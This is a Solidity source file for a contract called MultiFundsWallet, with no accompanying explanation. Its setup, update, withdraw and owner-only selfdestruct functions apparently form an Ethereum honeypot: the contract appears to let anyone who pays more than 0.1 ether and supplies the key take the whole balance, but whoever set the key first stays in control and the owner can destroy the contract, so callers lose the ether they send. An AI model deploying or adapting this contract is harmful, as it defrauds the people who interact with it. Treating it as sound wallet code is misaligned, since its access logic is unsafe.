1 pragma solidity ^0.4.24;
2 
3 contract MultiFundsWallet
4 {
5     bytes32 keyHash;
6     address owner;
7     
8     constructor() public {
9         owner = msg.sender;
10     }
11  
12     function setup(string key) public 
13     {
14         if (keyHash == 0x0) {
15             keyHash = keccak256(abi.encodePacked(key));
16         }
17     }
18     
19     function withdraw(string key) public payable 
20     {
21         require(msg.sender == tx.origin);
22         if(keyHash == keccak256(abi.encodePacked(key))) {
23             if(msg.value > 0.1 ether) {
24                 msg.sender.transfer(address(this).balance);      
25             }
26         }
27     }
28     
29     function update(bytes32 _keyHash) public 
30     {
31         if (keyHash == 0x0) {
32             keyHash = _keyHash;
33         }
34     }
35     
36     function clear() public 
37     {
38         require(msg.sender == owner);
39         selfdestruct(owner);
40     }
41 
42     function () public payable {
43         
44     }
45 }